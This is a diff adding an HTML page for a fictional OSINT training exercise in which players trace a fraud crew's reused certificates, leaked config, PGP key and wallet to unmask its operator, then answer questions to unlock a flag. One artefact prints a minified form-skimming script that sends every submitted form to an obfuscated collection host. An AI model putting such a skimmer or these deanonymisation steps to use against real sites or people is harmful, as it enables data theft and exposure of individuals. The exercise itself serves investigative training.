@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="robots" content="noindex,nofollow">
+<title>Operator exposure</title>
+<meta name="description" content="Operation Heatmap, Part 3: trace a fraud crew's reused infrastructure to its operator. Training exercise; all fictional.">
+<link rel="stylesheet" href="../rail.css?v=heatmap5">
+<link rel="stylesheet" href="../heatmap.css?v=heatmap5">
+<style>
+.intel{display:grid;grid-template-columns:1fr;gap:18px;margin:8px 0}
+@media(min-width:900px){.intel{grid-template-columns:1fr 1fr}}
+.intel .wide{grid-column:1/-1}
+.art{border:1px solid var(--line2);background:var(--paper);min-width:0}
+.art>figcaption{display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap;padding:9px 12px;border-bottom:1px solid var(--line2);background:var(--bg)}
+.art figcaption .tool{font:600 11px var(--mono);letter-spacing:.1em;text-transform:uppercase;color:var(--accent)}
+.art figcaption .src{font:500 11px var(--mono);color:var(--faint);word-break:break-all}
+.art .body{padding:12px 14px;overflow-x:auto}
+.term{font:13px/1.65 var(--mono);color:var(--ink2);white-space:pre;margin:0}
+.term .k{color:var(--mute)}.term .v{color:var(--ink)}.term .a{color:var(--accent)}.term .dim{color:var(--faint)}
+.ct{width:100%;border-collapse:collapse;font:12.5px var(--mono)}
+.ct th,.ct td{text-align:left;padding:7px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+.ct th{color:var(--mute);font-weight:500;font-size:11px;letter-spacing:.06em;text-transform:uppercase}
+.ct td{color:var(--ink2)}
+.ct .san{color:var(--ink);word-break:break-all}
+.dir{font:13px/1.9 var(--mono)}
+.dir a{color:var(--accent);text-decoration:none}
+.dir .meta{color:var(--faint)}
+.pgp{font:12px/1.5 var(--mono);color:var(--ink2);white-space:pre-wrap;word-break:break-all;margin:0}
+.pgp .fp{color:var(--accent)}
+.report{font-size:14px;line-height:1.65;color:var(--ink2)}
+.report b{color:var(--ink)}
+.report .addr{font-family:var(--mono);font-size:12.5px;color:var(--accent);word-break:break-all}
+.note{margin-top:8px;font:12px var(--mono);color:var(--faint)}
+</style>
+</head>
+<body>
+<script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script>
+<a class="skip" href="#main">Skip to content</a>
+<nav class="oprail" aria-label="Exercise">
+  <div class="oprail-in">
+    <span class="oprail-id"><span class="oprail-dot" aria-hidden="true"></span>Op Heatmap</span>
+    <p class="oprail-note">Training exercise. Every person, account, domain, key and record here is fictional. Do not use these techniques on real people or services.</p>
+    <ul class="oprail-nav">
+      <li><a href="/activity/">Brief</a></li>
+      <li class="sep" aria-hidden="true"></li>
+      <li><a href="/activity/pacelog/">Pacelog</a></li>
+      <li><a href="/activity/footprint/">JobHunt</a></li>
+      <li><a href="/activity/github/">GitHub</a></li>
+      <li><a href="/activity/steam/">Steam</a></li>
+      <li><a href="/activity/reddit/">Reddit</a></li>
+      <li class="sep" aria-hidden="true"></li>
+      <li><a href="/activity/investigate/">Investigate</a></li>
+      <li><a href="/activity/exposure/" aria-current="page">Exposure</a></li>
+      <li><a href="/activity/attribution/">Attribution</a></li>
+      <li><a href="/activity/casefile/">Casefile</a></li>
+    </ul>
+  </div>
+</nav>
+
+<main class="page wide" id="main">
+  <header class="head">
+    <div>
+      <p class="kicker"><span>Part 3</span><span class="d">/</span><span>Operator exposure</span></p>
+      <h1 class="display">Burn the <span class="hot">operator</span></h1>
+      <p class="lede">You named the crew. Now take it apart. The same people reuse keys, wallets and infrastructure across jobs, and they got sloppy with their own estate. Pull the live infrastructure apart, tie the aliases together, and pin down where they work from. Nothing here is labelled; make it line up.</p>
+    </div>
+  </header>
+
+  <section class="intel" aria-label="Collected intelligence">
+
+    <figure class="art wide" aria-label="Certificate transparency log">
+      <figcaption><span class="tool">crt.sh</span><span class="src">%.kitsune-ops.net</span></figcaption>
+      <div class="body">
+        <table class="ct">
+          <thead><tr><th scope="col">id</th><th scope="col">not before</th><th scope="col">issuer</th><th scope="col">matching identities (SAN)</th></tr></thead>
+          <tbody>
+            <tr><td>71104388</td><td>2026-04-29</td><td>R3</td><td class="san">kitsune-ops.net, www.kitsune-ops.net</td></tr>
+            <tr><td>71338201</td><td>2026-05-02</td><td>R3</td><td class="san">cdn.kitsune-analytics.example, kitsune-ops.net</td></tr>
+            <tr><td>72915640</td><td>2026-06-18</td><td>R3</td><td class="san">collect.kitsune-ops.net, mail.kitsune-ops.net</td></tr>
+            <tr><td>74450915</td><td>2026-08-02</td><td>E1</td><td class="san">panel.kitsune-ops.net</td></tr>
+            <tr><td>75002210</td><td>2026-08-27</td><td>R3</td><td class="san">apex-defence-recruitment.com, www.apex-defence-recruitment.com</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </figure>
+
+    <figure class="art" aria-label="Open directory on the collection host">
+      <figcaption><span class="tool">http index</span><span class="src">collect.kitsune-ops.net/.deploy/</span></figcaption>
+      <div class="body">
+        <pre class="dir"><span class="meta">Index of /.deploy/</span>
+<a href="#">../</a>
+<a href="#">.env.bak</a>            <span class="meta">2026-09-14 22:09   1.2K</span>
+<a href="#">beacon.min.js</a>       <span class="meta">2026-09-14 22:09   8.4K</span>
+<a href="#">deploy.log</a>          <span class="meta">2026-09-21 23:50   44K</span>
+<a href="#">rolepack.dotx</a>       <span class="meta">2026-09-14 22:11   31K</span></pre>
+      </div>
+    </figure>
+
+    <figure class="art" aria-label="Leaked environment file">
+      <figcaption><span class="tool">cat</span><span class="src">.env.bak</span></figcaption>
+      <div class="body">
+        <pre class="term"><span class="dim"># apex careers portal — do not commit</span>
+<span class="k">APP_ENV</span>=<span class="v">prod</span>
+<span class="k">COLLECT_ENDPOINT</span>=<span class="a">https://collect.kitsune-ops.net/ingest</span>
+<span class="k">PANEL_URL</span>=<span class="v">https://panel.kitsune-ops.net</span>
+<span class="k">SMTP_HOST</span>=<span class="v">mail.kitsune-ops.net</span>
+<span class="k">TZ</span>=<span class="v">Europe/Nicosia</span>
+<span class="k">LOCALE</span>=<span class="v">el_CY.UTF-8</span></pre>
+      </div>
+    </figure>
+
+    <figure class="art wide" aria-label="Beacon script">
+      <figcaption><span class="tool">beacon.min.js</span><span class="src">line 1 (minified)</span></figcaption>
+      <div class="body">
+        <pre class="term"><span class="dim">!function(e){var c=atob(<span class="a">"S0MtMjAyNi0xMQ=="</span>),u=atob("aHR0cHM6Ly9jb2xsZWN0Lmtpd...");</span>
+<span class="dim">  function b(d){navigator.sendBeacon(u+"?c="+c,d)}</span>
+<span class="dim">  document.addEventListener("submit",function(ev){b(new FormData(ev.target))})}(window);</span></pre>
+      </div>
+    </figure>
+
+    <figure class="art" aria-label="Operator PGP key on the forum">
+      <figcaption><span class="tool">forum profile</span><span class="src">user: kitsune_mc</span></figcaption>
+      <div class="body">
+        <pre class="pgp">PGP public key on file.
+Fingerprint:
+  <span class="fp">9F2C 4E1A 77D0 55B8 3C64
+  1E9A 220F D7B5 8A41 7D3B</span>
+Escrow: bc1q…k7s (ask for full)</pre>
+      </div>
+    </figure>
+
+    <figure class="art" aria-label="Signed paste under another alias">
+      <figcaption><span class="tool">paste</span><span class="src">#a7f20 &middot; "sig test" &middot; 2024</span></figcaption>
+      <div class="body">
+        <pre class="pgp">signed, just checking my key still works.
+— <span class="fp">voskhod_mc</span>
+
+-----BEGIN PGP SIGNATURE-----
+Comment: key 9F2C4E1A77D055B83C641E9A220FD7B58A417D3B
+iQIzBAEBCgAdFiEEnyxOGnfQVbg8ZB6aIg/XtYpBfTsFAm...
+-----END PGP SIGNATURE-----</pre>
+      </div>
+    </figure>
+
+    <figure class="art wide" aria-label="Fraud report excerpt">
+      <figcaption><span class="tool">report</span><span class="src">vendor-fraud bulletin 2026-Q3 &middot; excerpt</span></figcaption>
+      <div class="body">
+        <p class="report">A single escrow wallet, <span class="addr">bc1q0r5v9k7s</span>, was observed receiving candidate-data payments across multiple fake defence-recruitment brands through 2026. Confirmed brands reusing this wallet: <b>Apex Defence &amp; Security</b>, <b>Nordic Defence Careers</b> and <b>Gulf Protective Staffing</b>. Persona photography and the &ldquo;role pack&rdquo; template were shared across all three. Working hours cluster in the <b>EET (UTC+02:00)</b> band. A fourth brand sometimes linked in open reporting, &ldquo;Maritime Security Hire&rdquo;, resolves to the same host but has <b>not</b> been tied to this wallet.</p>
+        <p class="note">Wallet last seen 2026-09-29. Attribution: medium confidence.</p>
+      </div>
+    </figure>
+
+  </section>
+
+  <section class="qsec" aria-labelledby="qh">
+    <div class="part">
+      <div class="num" aria-hidden="true">06</div>
+      <div>
+        <p class="kicker">Part 3 &middot; Exposure</p>
+        <h2 id="qh">Pin them down</h2>
+        <p>Answer from the artefacts above. Each box checks itself when you leave it. Nothing is stored or sent anywhere. Get all six and the third flag unlocks. Flags take the form <code class="flagfmt">DMUH{…}</code>.</p>
+      </div>
+    </div>
+    <div class="meter">
+      <span class="label">Case</span>
+      <div class="cells" id="pcells" style="grid-template-columns:repeat(6,1fr)" aria-hidden="true"></div>
+      <div class="count" id="ptext" role="status" aria-live="polite">0 of 6 correct</div>
+    </div>
+    <div class="qgrid" id="qlist"></div>
+    <div class="qtools">
+      <span>Answers are not case-sensitive.</span>
+      <button type="button" class="btn quiet" id="qreset">Clear answers</button>
+    </div>
+    <div class="flag" id="flagwrap" hidden role="status" aria-live="polite">
+      <span class="stamp">Third flag</span>
+      <h3>Operator burned</h3>
+      <p>Infrastructure reuse, a recycled key and a shared wallet took you from a crew name to one person and one region. This is where real reporting stops: behaviour and infrastructure, held at the confidence the evidence supports.</p>
+      <div class="flagrow">
+        <code class="code" id="flag"></code>
+        <button type="button" class="btn" id="flagcopy">Copy flag</button>
+      </div>
+    </div>
+  </section>
+
+  <footer class="foot">
+    <span>Keys, wallets, certificates and the report are invented for this exercise.</span>
+    <span class="label">OP-HEATMAP &middot; Part 3</span>
+  </footer>
+</main>
+<script src="app.js?v=heatmap5"></script>
+</body>
+</html>
